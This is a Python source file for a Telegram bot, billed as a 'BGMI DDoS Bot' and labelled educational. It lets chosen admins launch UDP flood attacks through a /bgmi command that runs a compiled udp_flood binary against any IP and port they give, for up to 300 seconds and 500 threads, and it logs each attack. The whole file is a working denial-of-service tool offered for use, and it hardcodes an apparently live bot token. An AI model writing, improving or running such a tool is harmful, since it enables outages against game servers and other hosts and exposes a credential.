#!/usr/bin/env python3
# BGMI DDoS Bot – Python + C Hybrid (Educational)
import telebot
import subprocess
import threading
import time
import logging
import os
from datetime import datetime

# ========== CONFIG ==========
BOT_TOKEN = "8272183377:AAFQSx5Nd1tARAw2Z6PGSDM69X3MrCam9NU"   # Change this
ADMINS = [6135948216]                # Add your Telegram user ID

bot = telebot.TeleBot(BOT_TOKEN)
cooldown = {}
COOLDOWN_SEC = 10

logging.basicConfig(level=logging.INFO)

# Ensure C binary exists
if not os.path.exists("./udp_flood"):
    print("❌ udp_flood binary not found. Compile it first with: gcc -O3 -pthread -o udp_flood udp_flood.c")
    exit(1)

def launch_attack(ip, port, duration, threads, chat_id, user_id):
    """Call C binary for attack"""
    cmd = ["./udp_flood", ip, str(port), str(duration), str(threads)]
    try:
        # Run attack (blocking)
        subprocess.run(cmd, timeout=duration+5)
        bot.send_message(chat_id, f"✅ Attack finished on {ip}:{port}")
    except Exception as e:
        bot.send_message(chat_id, f"❌ Attack error: {str(e)}")
    # Log
    with open("attack_log.txt", "a") as f:
        f.write(f"{datetime.now()} - User {user_id} attacked {ip}:{port} for {duration}s\n")

@bot.message_handler(commands=['start'])
def start_cmd(msg):
    bot.reply_to(msg, "🔥 BGMI DDoS Bot (C + Python Hybrid)\n\nCommands:\n/bgmi <IP> <port> <seconds> <threads>\nExample: /bgmi 1.2.3.4 8080 60 100\n\n⚠️ Educational only!")

@bot.message_handler(commands=['bgmi'])
def bgmi_cmd(msg):
    user = msg.from_user.id
    if user not in ADMINS:
        bot.reply_to(msg, "❌ Not authorized.")
        return
    
    args = msg.text.split()
    if len(args) != 5:
        bot.reply_to(msg, "Usage: /bgmi <IP> <port> <seconds> <threads>\nExample: /bgmi 8.8.8.8 53 30 50")
        return
    
    ip = args[1]
    port = int(args[2])
    duration = int(args[3])
    threads = int(args[4])
    
    if duration > 300:
        bot.reply_to(msg, "Max duration 300 sec.")
        return
    if threads > 500:
        bot.reply_to(msg, "Max threads 500.")
        return
    
    # Cooldown
    now = time.time()
    if user in cooldown and now - cooldown[user] < COOLDOWN_SEC:
        rem = int(COOLDOWN_SEC - (now - cooldown[user]))
        bot.reply_to(msg, f"Cooldown: wait {rem}s")
        return
    
    cooldown[user] = now
    bot.reply_to(msg, f"🔥 Attacking {ip}:{port} for {duration}s with {threads} threads...")
    
    thread = threading.Thread(target=launch_attack, args=(ip, port, duration, threads, msg.chat.id, user))
    thread.start()

@bot.message_handler(commands=['logs'])
def logs(msg):
    if msg.from_user.id not in ADMINS:
        return
    try:
        with open("attack_log.txt", "r") as f:
            lines = f.read().splitlines()
            out = "\n".join(lines[-15:]) or "No logs."
            bot.reply_to(msg, f"📜 Last attacks:\n{out}")
    except:
        bot.reply_to(msg, "No log file.")

print("🤖 Bot running with C backend...")
bot.infinity_polling()
